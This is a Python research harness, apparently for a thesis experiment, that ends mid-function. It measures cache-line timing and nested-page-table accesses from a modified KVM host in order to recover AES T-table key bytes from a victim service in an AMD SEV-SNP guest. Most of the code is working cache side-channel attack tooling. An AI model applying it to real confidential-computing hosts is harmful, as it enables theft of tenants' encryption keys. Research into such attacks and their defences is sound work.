#!/usr/bin/env python3
from __future__ import annotations

import argparse
import csv
import errno
import hashlib
import json
import os
import random
import re
import socket
import statistics
import struct
import subprocess
import time
from pathlib import Path

from ch5_common import collect_host_facts, timestamped_outdir_ch5, write_json, write_lines
from experiment_common import (
    GUEST_KERNEL,
    INITRAMFS,
    OVMF_FD,
    QEMU_BIN,
    SRC_DIR,
    chown_to_sudo_user,
    ensure_artifacts,
    print_banner,
    require_root,
    stop_proc,
)


PAGE_SZ = 4096
LINE_SZ = 64
TABLE_BYTES = 1024
TABLE_COUNT = 4
TOTAL_TABLE_BYTES = TABLE_BYTES * TABLE_COUNT
PRIVATE_ALIAS_BASE = 1 << 32

KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE = 4
KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE = 2
KVM_AMD_NPT_ACCESS_F_FLUSH_TLB = 1 << 0
NPTCTL_MAGIC = 0x4E505443  # "NPTC"
NPTCTL_CMD_PING = 1
NPTCTL_CMD_GPA_TO_HPA = 2
NPTCTL_CMD_READ_GPA = 3
NPTCTL_CMD_NPT_CLEAR = 4
NPTCTL_CMD_NPT_SCAN = 5
NPTCTL_CMD_READ_GPA_BATCH = 6
NPTCTL_CMD_SYNC_MEASURE_MASK = 7
FMT_NPTCTL_REQ = "<IHHQQQQ"
FMT_NPTCTL_RESP = "<IHHiiQQQQ"
NPTCTL_SCAN_MAX_ENTRIES = 1 << 20

TRUE_AES_KEY = bytes(
    [0x5A, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]
)

PHASE2_WEIGHT = 0.25
PHASE2_TAIL_WEIGHT = 0.50
DEFAULT_FUSION_MODE = "weighted_fixed"
DEFAULT_NOISE_LINES = {3, 4}  # Line 3/4 often act as background always-hit lines.
DEFAULT_TEMPLATE_PATTERN_BYTES = 512

PREHEAT_READS = 3

BOOT_ORACLE_RE = re.compile(
    r"victim_aes_oracle: .*?te0_gpa=0x([0-9a-fA-F]+)\s+te0_page_gpa=0x([0-9a-fA-F]+)"
)


def te_cl_base_gpa(te0_gpa: int) -> int:
    return te0_gpa & ~(LINE_SZ - 1)


def te0_cl_offset(te0_gpa: int) -> int:
    return te0_gpa & (LINE_SZ - 1)


def te_total_lines(te0_gpa: int) -> int:
    return (te0_cl_offset(te0_gpa) + TOTAL_TABLE_BYTES + (LINE_SZ - 1)) // LINE_SZ


def line_to_gpa(te0_gpa: int, line: int) -> int:
    return te_cl_base_gpa(te0_gpa) + line * LINE_SZ


def table_line_range(te0_gpa: int, table_idx: int) -> tuple[int, int]:
    if table_idx < 0 or table_idx >= TABLE_COUNT:
        raise ValueError(f"invalid table_idx={table_idx}")
    start_b = te0_cl_offset(te0_gpa) + table_idx * TABLE_BYTES
    end_b = start_b + TABLE_BYTES - 1
    return (start_b // LINE_SZ, end_b // LINE_SZ)


def predicted_line_for_key_byte(te0_gpa: int, byte_pos: int, pt_byte: int, key_guess: int) -> int:
    table_idx = byte_pos % TABLE_COUNT
    idx = (pt_byte ^ key_guess) & 0xFF
    byte_off = table_idx * TABLE_BYTES + idx * 4
    return (te0_cl_offset(te0_gpa) + byte_off) // LINE_SZ


def table_partition_for_line(
    te0_gpa: int,
    line: int,
    table_idx: int,
    pattern_bytes: int,
) -> int:
    t_start, _ = table_line_range(te0_gpa, table_idx)
    local_line = line - t_start
    if local_line < 0:
        return 0
    pattern_lines = max(1, int(pattern_bytes) // LINE_SZ)
    return (local_line // pattern_lines) & 1


def predicted_partition_for_key_byte(
    te0_gpa: int,
    byte_pos: int,
    pt_byte: int,
    key_guess: int,
    pattern_bytes: int,
) -> int:
    table_idx = byte_pos % TABLE_COUNT
    line = predicted_line_for_key_byte(te0_gpa, byte_pos, pt_byte, key_guess)
    return table_partition_for_line(te0_gpa, line, table_idx, pattern_bytes)


def pearson_corr(xs: list[float], ys: list[float]) -> float:
    n = min(len(xs), len(ys))
    if n < 2:
        return 0.0
    x = xs[:n]
    y = ys[:n]
    mx = statistics.fmean(x)
    my = statistics.fmean(y)
    num = 0.0
    dx2 = 0.0
    dy2 = 0.0
    for a, b in zip(x, y):
        da = a - mx
        db = b - my
        num += da * db
        dx2 += da * da
        dy2 += db * db
    if dx2 <= 1e-12 or dy2 <= 1e-12:
        return 0.0
    return num / ((dx2 * dy2) ** 0.5)


def line_table_membership(te0_gpa: int, line: int) -> list[int]:
    memberships: list[int] = []
    line_start_b = line * LINE_SZ - te0_cl_offset(te0_gpa)
    line_end_b = line_start_b + LINE_SZ - 1
    for t in range(TABLE_COUNT):
        t_start = t * TABLE_BYTES
        t_end = t_start + TABLE_BYTES - 1
        if not (line_end_b < t_start or line_start_b > t_end):
            memberships.append(t)
    return memberships


def row_memberships(row: dict[str, object]) -> list[int]:
    raw = str(row.get("table_membership", ""))
    out: list[int] = []
    for x in raw.split(","):
        x = x.strip()
        if not x:
            continue
        try:
            out.append(int(x))
        except ValueError:
            continue
    return out


def line_score(row: dict[str, float | int]) -> float:
    memberships = row_memberships(row)
    # Strong penalty for cross-table boundary lines to reduce ambiguous evidence.
    if len(memberships) != 1:
        return 0.0

    delta = max(0.0, float(row.get("delta_mean", 0.0)))
    if delta <= 0.0:
        return 0.0

    h0_mean = float(row.get("h0_mean", 0.0))
    h0_std = max(0.0, float(row.get("h0_std", 0.0)))
    h1_std = max(0.0, float(row.get("h1_std", 0.0)))
    p_gt = min(1.0, max(0.0, float(row.get("p_gt", 0.0))))

    noise = max(1.0, max(h0_std, h1_std))
    snr = delta / noise
    pooled = ((h0_std * h0_std + h1_std * h1_std) * 0.5) ** 0.5
    separation = delta / max(1.0, pooled)
    relative_gain = delta / max(1.0, abs(h0_mean))

    # Weighted geometric blend: prioritise SNR and separation, keep confidence.
    return (snr ** 0.45) * (separation ** 0.35) * (p_gt ** 0.15) * (relative_gain ** 0.05)


def robust_center(samples: list[int]) -> float:
    if not samples:
        return 0.0
    return float(statistics.median(samples))


def percentile_int(samples: list[int], q: float) -> int:
    if not samples:
        return 0
    if q <= 0.0:
        return int(min(samples))
    if q >= 1.0:
        return int(max(samples))
    arr = sorted(int(x) for x in samples)
    idx = int(round((len(arr) - 1) * q))
    idx = max(0, min(idx, len(arr) - 1))
    return int(arr[idx])


def build_table_topk_sets(
    line_rows: list[dict[str, float | int]],
) -> tuple[dict[str, list[int]], dict[int, list[dict[str, float | int]]]]:
    table_ranked: dict[int, list[dict[str, float | int]]] = {0: [], 1: [], 2: [], 3: []}
    for row in line_rows:
        line = int(row["line"])
        if line < 0:
            continue
        for t in row_memberships(row):
            if t in table_ranked:
                table_ranked[t].append(row)

    for t in range(4):
        uniq: dict[int, dict[str, float | int]] = {}
        for row in table_ranked[t]:
            uniq[int(row["line"])] = row
        ranked = sorted(uniq.values(), key=line_score, reverse=True)
        table_ranked[t] = ranked

    def topn_per_table(n: int) -> list[int]:
        lines: list[int] = []
        for t in range(4):
            lines.extend(int(r["line"]) for r in table_ranked[t][:n])
        return sorted(set(lines))

    top_all = sorted(set(int(r["line"]) for r in line_rows))
    top64 = sorted(set(x for x in top_all if 0 <= x <= 63))
    k_sets = {
        "top1": topn_per_table(1),
        "top2": topn_per_table(2),
        "top3": topn_per_table(3),
        "top4": topn_per_table(4),
        "top5": topn_per_table(5),
        "top8": topn_per_table(8),
        "top64": top64,
        "top_all": top_all,
    }
    return k_sets, table_ranked


def build_line_thresholds(
    line_rows: list[dict[str, float | int]],
    theta_mode: str,
    theta_global: int,
    theta_scale: float,
) -> dict[int, float]:
    out: dict[int, float] = {}
    auto_global = float(theta_global)
    if theta_mode == "global" and int(theta_global) <= 0:
        h0s = [float(r.get("h0_mean", 0.0)) for r in line_rows]
        h1s = [float(r.get("h1_mean", 0.0)) for r in line_rows]
        if h0s and h1s:
            auto_global = (float(statistics.median(h0s)) + float(statistics.median(h1s))) * 0.5
        else:
            auto_global = 0.0
    for r in line_rows:
        line = int(r["line"])
        h0 = float(r["h0_mean"])
        h1 = float(r["h1_mean"])
        if theta_mode == "global":
            th = float(auto_global)
        elif theta_mode == "line_mid":
            th = (h0 + h1) * 0.5
        elif theta_mode == "line_sigma":
            h0_std = float(r.get("h0_std", 0.0))
            th = h0 + theta_scale * h0_std
        else:
            th = h0 + theta_scale * (h1 - h0)
        out[line] = th
    return out


class NptCtlClient:
    def __init__(self, sock_path: Path, timeout_s: float = 3.0) -> None:
        self.sock_path = Path(sock_path)
        self.timeout_s = timeout_s
        self.sock: socket.socket | None = None

    def connect(self) -> None:
        if self.sock is not None:
            return
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(self.timeout_s)
        s.connect(str(self.sock_path))
        self.sock = s

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _recv_exact(self, n: int) -> bytes:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        data = b""
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                raise RuntimeError("nptctl socket closed")
            data += chunk
        return data

    def _request(self, cmd: int, a: int = 0, b: int = 0, c: int = 0, d: int = 0) -> tuple[int, int, int, int]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        req = struct.pack(FMT_NPTCTL_REQ, NPTCTL_MAGIC, cmd, 0, a, b, c, d)
        self.sock.sendall(req)
        raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, v1, v2, v3 = struct.unpack(FMT_NPTCTL_RESP, raw)
        if magic != NPTCTL_MAGIC or cmd_r != cmd:
            raise RuntimeError(f"nptctl bad response magic=0x{magic:x} cmd={cmd_r} expect={cmd}")
        if status != 0:
            eno = sys_errno if sys_errno != 0 else 5
            raise OSError(eno, os.strerror(eno))
        return (kret, v0, v1, v2 if cmd != NPTCTL_CMD_GPA_TO_HPA else v3)

    def ping(self) -> None:
        self._request(NPTCTL_CMD_PING)

    def gpa_to_hpa(self, gpa: int) -> dict[str, int]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        req = struct.pack(FMT_NPTCTL_REQ, NPTCTL_MAGIC, NPTCTL_CMD_GPA_TO_HPA, 0, gpa, 0, 0, 0)
        self.sock.sendall(req)
        raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, v1, _v2, _v3 = struct.unpack(FMT_NPTCTL_RESP, raw)
        if magic != NPTCTL_MAGIC or cmd_r != NPTCTL_CMD_GPA_TO_HPA:
            raise RuntimeError("nptctl bad gpa_to_hpa response")
        if status != 0:
            eno = sys_errno if sys_errno != 0 else 5
            raise OSError(eno, os.strerror(eno))
        return {"gpa": int(gpa), "hpa": int(v0), "hva": int(v1), "ret": int(kret)}

    def read_gpa_tsc(self, gpa: int, mode: int) -> int:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        req = struct.pack(FMT_NPTCTL_REQ, NPTCTL_MAGIC, NPTCTL_CMD_READ_GPA, 0, gpa, mode, 0, 0)
        self.sock.sendall(req)
        raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, _v1, _v2, _v3 = struct.unpack(FMT_NPTCTL_RESP, raw)
        if magic != NPTCTL_MAGIC or cmd_r != NPTCTL_CMD_READ_GPA:
            raise RuntimeError("nptctl bad read_gpa response")
        if status != 0:
            eno = sys_errno if sys_errno != 0 else 5
            raise OSError(eno, os.strerror(eno))
        if int(kret) != 0:
            raise RuntimeError(f"KVM_AMD_READ_GPA ret={int(kret)} gpa=0x{gpa:x}")
        return int(v0)

    def read_gpa_tsc_batch(self, gpa: int, mode: int, nr_samples: int, flags: int = 0) -> list[int]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        if nr_samples <= 0:
            return []
        req = struct.pack(
            FMT_NPTCTL_REQ,
            NPTCTL_MAGIC,
            NPTCTL_CMD_READ_GPA_BATCH,
            0,
            gpa,
            mode,
            nr_samples,
            flags,
        )
        self.sock.sendall(req)
        raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, _v1, _v2, _v3 = struct.unpack(FMT_NPTCTL_RESP, raw)
        if magic != NPTCTL_MAGIC or cmd_r != NPTCTL_CMD_READ_GPA_BATCH:
            raise RuntimeError("nptctl bad read_gpa_batch response")
        if status != 0:
            eno = sys_errno if sys_errno != 0 else 5
            raise OSError(eno, os.strerror(eno))
        if int(kret) != 0:
            raise RuntimeError(f"KVM_AMD_READ_GPA_BATCH ret={int(kret)} gpa=0x{gpa:x}")
        got = int(v0)
        payload = self._recv_exact(got * 8) if got > 0 else b""
        if got <= 0:
            return []
        return [int(x) for x in struct.unpack(f"<{got}Q", payload)]

    def npt_clear(self, gpa_start: int, gpa_end: int, flags: int) -> dict[str, int]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        req = struct.pack(FMT_NPTCTL_REQ, NPTCTL_MAGIC, NPTCTL_CMD_NPT_CLEAR, 0, gpa_start, gpa_end, flags, 0)
        self.sock.sendall(req)
        raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, v1, _v2, _v3 = struct.unpack(FMT_NPTCTL_RESP, raw)
        if magic != NPTCTL_MAGIC or cmd_r != NPTCTL_CMD_NPT_CLEAR:
            raise RuntimeError("nptctl bad npt_clear response")
        if status != 0:
            eno = sys_errno if sys_errno != 0 else 5
            raise OSError(eno, os.strerror(eno))
        return {
            "gpa_start": int(gpa_start),
            "gpa_end": int(gpa_end),
            "flags": int(flags),
            "pages_scanned": int(v0),
            "pages_cleared": int(v1),
            "ret": int(kret),
        }

    def npt_scan(self, gpa_start: int, gpa_end: int, max_entries: int) -> dict[str, object]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        req = struct.pack(FMT_NPTCTL_REQ, NPTCTL_MAGIC, NPTCTL_CMD_NPT_SCAN, 0, gpa_start, gpa_end, max_entries, 0)
        self.sock.sendall(req)
        raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, v1, v2, _v3 = struct.unpack(FMT_NPTCTL_RESP, raw)
        if magic != NPTCTL_MAGIC or cmd_r != NPTCTL_CMD_NPT_SCAN:
            raise RuntimeError("nptctl bad npt_scan response")
        if status != 0:
            eno = sys_errno if sys_errno != 0 else 5
            raise OSError(eno, os.strerror(eno))
        entries_written = int(v0)
        payload = self._recv_exact(entries_written * 8) if entries_written > 0 else b""
        pages = list(struct.unpack(f"<{entries_written}Q", payload)) if entries_written > 0 else []
        return {
            "gpa_start": int(gpa_start),
            "gpa_end": int(gpa_end),
            "max_entries": int(max_entries),
            "entries_written": entries_written,
            "pages_scanned": int(v1),
            "pages_accessed": int(v2),
            "ret": int(kret),
            "pages": pages,
        }

    def sync_measure_mask(
        self,
        page_gpa: int,
        mode: int,
        line_mask: int,
        repeats: int = 1,
    ) -> dict[str, object]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        old_timeout = self.sock.gettimeout()
        # Sync-mode rounds can be intentionally slow under defended settings
        # (e.g. MBA-limited host group). Keep the client-side timeout aligned
        # with the host runner's longer wait budget so we don't give up first.
        self.sock.settimeout(max(float(self.timeout_s), 60.0))
        if line_mask == 0:
            raise ValueError("line_mask must be non-zero")
        try:
            req = struct.pack(
                FMT_NPTCTL_REQ,
                NPTCTL_MAGIC,
                NPTCTL_CMD_SYNC_MEASURE_MASK,
                0,
                int(page_gpa),
                int(mode),
                int(line_mask) & 0xFFFFFFFFFFFFFFFF,
                int(repeats),
            )
            self.sock.sendall(req)
            raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
            magic, cmd_r, status, sys_errno, kret, v0, v1, v2, v3 = struct.unpack(FMT_NPTCTL_RESP, raw)
            if magic != NPTCTL_MAGIC or cmd_r != NPTCTL_CMD_SYNC_MEASURE_MASK:
                raise RuntimeError("nptctl bad sync_measure_mask response")
            if status != 0:
                eno = sys_errno if sys_errno != 0 else 5
                raise OSError(eno, os.strerror(eno))
            payload = self._recv_exact(64 * 8)
            cycles = [int(x) for x in struct.unpack("<64Q", payload)]
            return {
                "seq": int(v0),
                "repeats": int(v1),
                "page_hpa": int(v2),
                "shared_gpa": int(v3),
                "cycles": cycles,
                "ret": int(kret),
            }
        finally:
            self.sock.settimeout(old_timeout)


def parse_u64(raw: str) -> int:
    raw = raw.strip()
    if raw.lower().startswith("0x"):
        return int(raw, 16)
    return int(raw, 10)


def parse_mem_to_bytes(raw: str) -> int:
    s = raw.strip().upper()
    if not s:
        raise ValueError("empty mem size")
    unit = s[-1]
    if unit in ("K", "M", "G"):
        n = int(s[:-1])
        mul = {"K": 1024, "M": 1024 * 1024, "G": 1024 * 1024 * 1024}[unit]
        return n * mul
    return int(s, 10)


def default_scan_end_for_mem(mem_bytes: int) -> int:
    # Keep discovery compatible with SNP private alias window above 4GB.
    if mem_bytes <= 0:
        return PRIVATE_ALIAS_BASE
    if mem_bytes <= PRIVATE_ALIAS_BASE:
        return PRIVATE_ALIAS_BASE + mem_bytes
    return mem_bytes


def recv_exact(sock: socket.socket, n: int) -> bytes:
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            break
        data += chunk
    return data


def aes_request(host: str, port: int, plaintext: bytes, timeout_s: float) -> bytes:
    if len(plaintext) != 16:
        raise ValueError("plaintext must be exactly 16 bytes")
    with socket.create_connection((host, port), timeout=timeout_s) as s:
        s.sendall(plaintext)
        out = recv_exact(s, 16)
    if len(out) != 16:
        raise RuntimeError(f"AES service short response: got={len(out)} bytes")
    return out


def aes_request_async_start(host: str, port: int, plaintext: bytes, timeout_s: float) -> dict[str, object]:
    if len(plaintext) != 16:
        raise ValueError("plaintext must be exactly 16 bytes")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout_s)
    s.connect((host, port))
    s.sendall(plaintext)
    s.setblocking(False)
    return {
        "sock": s,
        "buf": bytearray(),
        "start_ns": time.perf_counter_ns(),
        "timeout_s": float(timeout_s),
    }


def aes_request_async_poll(req: dict[str, object]) -> bool:
    s = req["sock"]
    if not isinstance(s, socket.socket):
        raise RuntimeError("invalid async request socket")
    buf = req["buf"]
    if not isinstance(buf, bytearray):
        raise RuntimeError("invalid async request buffer")
    try:
        chunk = s.recv(16 - len(buf))
    except BlockingIOError:
        return False
    except InterruptedError:
        return False
    if chunk:
        buf.extend(chunk)
    return len(buf) >= 16


def aes_request_async_finish(req: dict[str, object]) -> bytes:
    s = req["sock"]
    if not isinstance(s, socket.socket):
        raise RuntimeError("invalid async request socket")
    buf = req["buf"]
    if not isinstance(buf, bytearray):
        raise RuntimeError("invalid async request buffer")
    deadline = time.perf_counter() + float(req.get("timeout_s", 3.0))
    done = len(buf) >= 16
    while not done and time.perf_counter() < deadline:
        done = aes_request_async_poll(req)
        if not done:
            time.sleep(0.0002)
    try:
        s.close()
    except OSError:
        pass
    if len(buf) != 16:
        raise RuntimeError(f"AES async short response: got={len(buf)} bytes")
    return bytes(buf)


def lines_to_mask(lines: list[int]) -> int:
    mask = 0
    for line in lines:
        if 0 <= int(line) < 64:
            mask |= 1 << int(line)
    return mask


def sync_aes_measure_mask(
    vm_ctl: NptCtlClient,
    args: argparse.Namespace,
    page_gpa: int,
    plaintext: bytes,
    mode: int,
    line_mask: int,
    repeats: int = 1,
) -> list[int]:
    max_attempts = 3
    last_exc: Exception | None = None
    for attempt in range(max_attempts):
        req = aes_request_async_start(args.host, args.aes_sync_port, plaintext, timeout_s=args.sock_timeout_s)
        resp: dict[str, object] | None = None
        original_exc: Exception | None = None
        try:
            resp = vm_ctl.sync_measure_mask(page_gpa, mode, line_mask, repeats=max(1, int(repeats)))
        except Exception as e:
            original_exc = e
            last_exc = e
        finally:
            try:
                _ = aes_request_async_finish(req)
            except Exception as e:
                if original_exc is None:
                    last_exc = RuntimeError(
                        f"sync_aes_measure_mask finish failed: aes_sync_port={args.aes_sync_port} "
                        f"page_gpa=0x{page_gpa:x} mode={mode} line_mask=0x{line_mask:x} repeats={repeats}: {e}"
                    )
                # If the sync round itself already failed, prefer that original error.
        if resp is not None:
            return [int(x) for x in resp["cycles"]]
        if (
            isinstance(last_exc, OSError)
            and getattr(last_exc, "errno", None) == errno.ETIMEDOUT
            and attempt + 1 < max_attempts
        ):
            time.sleep(0.2 * float(attempt + 1))
            continue
        break
    if last_exc is not None:
        raise last_exc
    raise RuntimeError("sync_aes_measure_mask missing response")


def sync_measure_lines_grouped(
    vm_ctl: NptCtlClient,
    args: argparse.Namespace,
    te0_gpa: int,
    plaintext: bytes,
    mode: int,
    lines: list[int],
    repeats: int = 1,
) -> dict[int, int]:
    groups: dict[int, list[tuple[int, int]]] = {}
    out: dict[int, int] = {}

    for line in sorted(set(int(x) for x in lines if int(x) >= 0)):
        gpa = line_to_gpa(te0_gpa, line)
        page_gpa = gpa & ~(PAGE_SZ - 1)
        local_line = (gpa & (PAGE_SZ - 1)) // LINE_SZ
        groups.setdefault(page_gpa, []).append((line, local_line))

    for page_gpa, members in groups.items():
        mask = 0
        for _global_line, local_line in members:
            mask |= 1 << local_line
        cycles = sync_aes_measure_mask(
            vm_ctl,
            args,
            page_gpa,
            plaintext,
            mode,
            mask,
            repeats=repeats,
        )
        for global_line, local_line in members:
            out[global_line] = int(cycles[local_line])

    return out


def wait_tcp_ready(host: str, port: int, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1.0):
                return True
        except OSError:
            time.sleep(0.5)
    return False


def wait_vm_ready(host: str, aes_port: int, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            _ = aes_request(host, aes_port, b"\x00" * 16, timeout_s=1.5)
            return True
        except Exception:
            pass
        time.sleep(1.0)
    return False


def wait_nptctl_ready(sock_path: Path, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if sock_path.exists():
            cli = NptCtlClient(sock_path=sock_path, timeout_s=1.5)
            try:
                cli.connect()
                cli.ping()
                cli.close()
                return True
            except Exception:
                cli.close()
        time.sleep(0.3)
    return False


def ioctl_gpa_to_hpa(vm_ctl: NptCtlClient, gpa: int) -> dict[str, int]:
    return vm_ctl.gpa_to_hpa(gpa)


def ioctl_read_gpa_tsc(vm_ctl: NptCtlClient, gpa: int, mode: int = KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE) -> int:
    return vm_ctl.read_gpa_tsc(gpa, mode)


def ioctl_read_gpa_tsc_batch(
    vm_ctl: NptCtlClient,
    gpa: int,
    mode: int = KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
    nr_samples: int = 1,
    flags: int = 0,
) -> list[int]:
    return vm_ctl.read_gpa_tsc_batch(gpa, mode, nr_samples, flags)


def ioctl_npt_clear(vm_ctl: NptCtlClient, gpa_start: int, gpa_end: int, flush_tlb: bool = True) -> dict[str, int]:
    flags = KVM_AMD_NPT_ACCESS_F_FLUSH_TLB if flush_tlb else 0
    return vm_ctl.npt_clear(gpa_start, gpa_end, flags)


def ioctl_npt_scan(vm_ctl: NptCtlClient, gpa_start: int, gpa_end: int, max_entries: int) -> dict[str, object]:
    return vm_ctl.npt_scan(gpa_start, gpa_end, max_entries)


def calibrate_contention_window(
    vm_ctl: NptCtlClient,
    args: argparse.Namespace,
    target_gpa: int,
) -> dict[str, float | int]:
    if bool(getattr(args, "enable_aes_sync", False)):
        return {
            "offset_us": 0.0,
            "sigma_us": 0.0,
            "hits": 0,
            "trials": 0,
        }
    trials = max(0, int(args.contention_calib_trials))
    if trials == 0:
        return {
            "offset_us": float(args.contention_offset_us),
            "sigma_us": float(args.contention_sigma_us),
            "hits": 0,
            "trials": 0,
        }

    offsets_us: list[float] = []
    for _ in range(trials):
        # Preheat first so the following H0->H1 transition is observable.
        for _ in range(PREHEAT_READS):
            _ = ioctl_read_gpa_tsc(vm_ctl, target_gpa, mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE)
        baseline_lat = ioctl_read_gpa_tsc(vm_ctl, target_gpa, mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE)
        # Adaptive rise threshold for this trial (instead of fixed global theta).
        dyn_theta = max(float(baseline_lat) + 120.0, float(baseline_lat) * 1.35)
        pt = os.urandom(16)
        req = aes_request_async_start(args.host, args.aes_port, pt, timeout_s=args.sock_timeout_s)
        start_ns = int(req["start_ns"])
        deadline_ns = start_ns + int(float(args.sock_timeout_s) * 1_000_000_000)
        first_hit_us: float | None = None
        while True:
            now_ns = time.perf_counter_ns()
            done = aes_request_async_poll(req)
            # Per ch5.md 5.3-A': use cacheable probing to detect first coherence H1.
            lat = ioctl_read_gpa_tsc(vm_ctl, target_gpa, mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE)
            if first_hit_us is None and float(lat) > dyn_theta:
                first_hit_us = (now_ns - start_ns) / 1000.0
            if done or now_ns >= deadline_ns:
                break
        try:
            _ = aes_request_async_finish(req)
        except Exception:
            pass
        if first_hit_us is not None:
            offsets_us.append(first_hit_us)

    if not offsets_us:
        return {
            "offset_us": float(args.contention_offset_us),
            "sigma_us": float(args.contention_sigma_us),
            "hits": 0,
            "trials": trials,
        }

    mean_us = statistics.fmean(offsets_us)
    sigma_us = statistics.pstdev(offsets_us) if len(offsets_us) > 1 else 0.0
    return {
        "offset_us": float(mean_us),
        "sigma_us": float(sigma_us),
        "hits": len(offsets_us),
        "trials": trials,
    }


def calibrate_contention_thresholds(
    vm_ctl: NptCtlClient,
    args: argparse.Namespace,
    target_gpa: int,
    offset_us: float,
    sigma_us: float,
) -> dict[str, float | int]:
    target_page_gpa = target_gpa & ~(PAGE_SZ - 1)
    target_line = (target_gpa & (PAGE_SZ - 1)) // LINE_SZ
    target_mask = 1 << target_line

    if bool(getattr(args, "enable_aes_sync", False)):
        trials = max(16, int(args.contention_calib_trials))
        baseline_lat: list[int] = []
        trigger_lat: list[int] = []
        for _ in range(trials):
            for _ in range(PREHEAT_READS):
                _ = ioctl_read_gpa_tsc(vm_ctl, target_gpa, mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE)
            baseline_lat.append(
                ioctl_read_gpa_tsc(vm_ctl, target_gpa, mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE)
            )
            pt = os.urandom(16)
            cycles = sync_aes_measure_mask(
                vm_ctl,
                args,
                target_page_gpa,
                pt,
                KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
                target_mask,
                repeats=max(1, int(args.contention_probe_rounds)),
            )
            trigger_lat.append(int(cycles[target_line]))
        b_med = float(statistics.median(baseline_lat)) if baseline_lat else 0.0
        t_med = float(statistics.median(trigger_lat)) if trigger_lat else 0.0
        theta_contention = int(round((b_med + t_med) * 0.5)) if baseline_lat and trigger_lat else int(max(1, args.theta_contention))
        theta_contention_tail = (
            int(percentile_int(trigger_lat, 0.90)) if trigger_lat else int(max(1, args.theta_contention_tail))
        )
        if theta_contention_tail <= theta_contention:
            theta_contention_tail = theta_contention + max(1, int((t_med - b_med) * 0.25))
        return {
            "theta_contention": int(theta_contention),
            "theta_contention_tail": int(theta_contention_tail),
            "baseline_median": float(b_med),
            "trigger_median": float(t_med),
            "window_start_us": 0.0,
            "window_end_us": 0.0,
        }

    trials = max(16, int(args.contention_calib_trials))
    window_half_us = max(
        float(args.contention_min_window_us),
        float(args.contention_window_sigma) * max(0.0, float(sigma_us)),
    )
    window_start_us = max(0.0, float(offset_us) - window_half_us)
    window_end_us = max(window_start_us, float(offset_us) + window_half_us)

    baseline_lat: list[int] = []
    trigger_lat: list[int] = []

    for _ in range(trials):
        for _ in range(PREHEAT_READS):
            _ = ioctl_read_gpa_tsc(vm_ctl, target_gpa, mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE)
        baseline_lat.append(
            ioctl_read_gpa_tsc(vm_ctl, target_gpa, mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE)
        )

        pt = os.urandom(16)
        req = aes_request_async_start(args.host, args.aes_port, pt, timeout_s=args.sock_timeout_s)
        start_ns = int(req["start_ns"])
        deadline_ns = start_ns + int(float(args.sock_timeout_s) * 1_000_000_000)
        max_t = 0
        while True:
            now_ns = time.perf_counter_ns()
            done = aes_request_async_poll(req)
            rel_us = (now_ns - start_ns) / 1000.0
            if rel_us >= window_start_us and rel_us <= window_end_us:
                t2 = ioctl_read_gpa_tsc(
                    vm_ctl,
                    target_gpa,
                    mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
                )
                if int(t2) > max_t:
                    max_t = int(t2)
            if done or now_ns >= deadline_ns:
                break
            if rel_us > window_end_us and max_t > 0:
                break
            time.sleep(0.00005)
        try:
            _ = aes_request_async_finish(req)
        except Exception:
            pass
        if max_t <= 0:
            max_t = ioctl_read_gpa_tsc(
                vm_ctl,
                target_gpa,
                mode=KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
            )
        trigger_lat.append(int(max_t))

    if not baseline_lat or not trigger_lat:
        return {
            "theta_contention": int(max(1, args.theta_contention)),
            "theta_contention_tail": int(max(1, args.theta_contention_tail)),
            "baseline_median": 0.0,
            "trigger_median": 0.0,
            "window_start_us": float(window_start_us),
            "window_end_us": float(window_end_us),
        }

    b_med = float(statistics.median(baseline_lat))
    t_med = float(statistics.median(trigger_lat))
